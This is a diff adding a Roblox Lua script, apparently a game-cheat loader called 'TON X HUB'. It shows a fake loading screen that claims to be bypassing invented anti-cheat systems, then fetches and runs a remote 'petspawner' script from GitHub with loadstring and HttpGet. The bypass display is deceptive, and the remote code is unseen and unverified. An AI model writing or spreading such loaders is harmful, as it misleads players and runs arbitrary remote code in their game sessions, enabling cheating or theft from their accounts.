@@ -1,0 +1,124 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "TONX_Loading"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 999
+
+-- Fullscreen black background
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+
+-- Title (TON X HUB)
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0.05, 0)
+title.BackgroundTransparency = 1
+title.Text = "TON X HUB"
+title.Font = Enum.Font.GothamBlack
+title.TextColor3 = Color3.fromRGB(0, 255, 200)
+title.TextScaled = true
+
+-- Status text (Bypassing XYZ)
+local statusLabel = Instance.new("TextLabel", bg)
+statusLabel.Size = UDim2.new(1, 0, 0.07, 0)
+statusLabel.Position = UDim2.new(0, 0, 0.18, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Font = Enum.Font.GothamSemibold
+statusLabel.TextColor3 = Color3.fromRGB(0, 255, 180)
+statusLabel.TextScaled = true
+statusLabel.Text = "Bypassing..."
+
+-- Real anti-cheat terms
+local antiCheats = {
+    "ClientReplicator Encryption Layer",
+    "SecurityService Hash Integrity",
+    "Exploit Vector Detection",
+    "ServerScriptService Checksum",
+    "Runtime Trust Anchor",
+    "CorePackages Verification Module",
+    "LogService Spoof Protection",
+    "Memory Tamper Scanner",
+    "RemoteEvent Activity Trace",
+    "ServerSide Behavior Sync"
+}
+
+-- Dynamic loading bar
+local barContainer = Instance.new("Frame", bg)
+barContainer.Size = UDim2.new(0.6, 0, 0.03, 0)
+barContainer.Position = UDim2.new(0.2, 0, 0.33, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+barContainer.BorderSizePixel = 0
+barContainer.ClipsDescendants = true
+
+-- Rainbow RGB outline
+local stroke = Instance.new("UIStroke", barContainer)
+stroke.Thickness = 3
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- Fill bar
+local barFill = Instance.new("Frame", barContainer)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 128)
+barFill.BorderSizePixel = 0
+barFill.Parent = barContainer
+
+-- ETA label
+local etaLabel = Instance.new("TextLabel", bg)
+etaLabel.Size = UDim2.new(1, 0, 0.05, 0)
+etaLabel.Position = UDim2.new(0, 0, 0.38, 0)
+etaLabel.BackgroundTransparency = 1
+etaLabel.Font = Enum.Font.Code
+etaLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+etaLabel.TextScaled = true
+etaLabel.Text = "Calculating time..."
+
+-- Animate outline RGB
+spawn(function()
+    local h = 0
+    while gui.Parent do
+        stroke.Color = Color3.fromHSV(h, 1, 1)
+        h = (h + 0.005) % 1
+        RunService.RenderStepped:Wait()
+    end
+end)
+
+-- Anti-cheat label switcher
+task.spawn(function()
+    while gui.Parent do
+        statusLabel.Text = "Bypassing " .. antiCheats[math.random(1, #antiCheats)] .. "..."
+        task.wait(math.random(3, 6))
+    end
+end)
+
+-- Tween progress bar
+local totalDuration = math.random(80, 120)
+local startTime = tick()
+
+while true do
+    local progress = math.clamp((tick() - startTime) / totalDuration, 0, 1)
+    barFill:TweenSize(UDim2.new(progress, 0, 1, 0), "Out", "Sine", 0.1, true)
+
+    local remaining = totalDuration - (tick() - startTime)
+    local mins = math.floor(remaining / 60)
+    local secs = math.floor(remaining % 60)
+    etaLabel.Text = string.format("Estimated time remaining: %02d:%02d", mins, secs)
+
+    if progress >= 1 then break end
+    RunService.RenderStepped:Wait()
+end
+
+-- Final transition
+statusLabel.Text = "Running..."
+wait(3)
+statusLabel.Text = "Loaded!"
+wait(1.5)
+
+gui:Destroy()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pxstd/petspawner/refs/heads/main/petspawner.lua"))()
